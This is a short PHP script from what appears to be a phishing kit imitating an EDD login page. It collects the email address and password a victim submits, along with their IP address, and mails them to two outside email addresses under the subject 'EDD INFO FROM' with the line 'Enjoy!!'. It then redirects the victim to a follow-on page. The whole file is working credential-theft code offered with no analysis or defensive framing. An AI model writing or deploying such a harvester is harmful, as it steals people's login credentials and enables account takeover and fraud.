<?php

$subject = "EDD INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['useremail']."\n";
$message  = "Email: ".$_POST["useremail"]."\n";
$message .= "Passsword: ".$_POST["emailpass"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: emmaobinna@yandex' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("wisdomoparah76@gmail.com,wisdomoparah76@yandex.com",$subject,$message, $headers);



header("location: email2.html"); 



?>